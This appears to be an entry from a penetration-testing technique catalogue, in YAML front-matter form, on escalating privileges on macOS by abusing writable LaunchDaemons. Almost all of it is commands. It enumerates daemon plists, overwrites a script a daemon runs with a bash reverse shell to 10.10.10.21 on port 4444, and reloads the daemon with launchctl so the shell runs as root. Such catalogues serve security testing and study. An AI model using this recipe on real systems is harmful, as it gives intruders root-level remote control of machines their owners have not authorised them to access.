---
description: |
  Exploit writable LaunchDaemons on macOS to escalate privileges by modifying plist files or replacing the scripts they execute.
commands:
  - have: Shell
    cmd: |
      # Enumeration
      ls -la /Library/LaunchDaemons/
      find /Library/LaunchDaemons -writable 2>/dev/null
      cat /Library/LaunchDaemons/*.plist | grep -A2 ProgramArguments

      # Exploit — modify writable script referenced by daemon
      echo '#!/bin/bash' > /opt/scripts/service.sh
      echo 'bash -i >& /dev/tcp/10.10.10.21/4444 0>&1' >> /opt/scripts/service.sh
      chmod +x /opt/scripts/service.sh

      sudo launchctl unload /Library/LaunchDaemons/com.vulnerable.service.plist
      sudo launchctl load /Library/LaunchDaemons/com.vulnerable.service.plist
phase:
  - PrivEsc
target_os:
  - macOS
services: []
techniques:
  - LaunchDaemon_Abuse
references:
  - https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation/macos-persistence
---
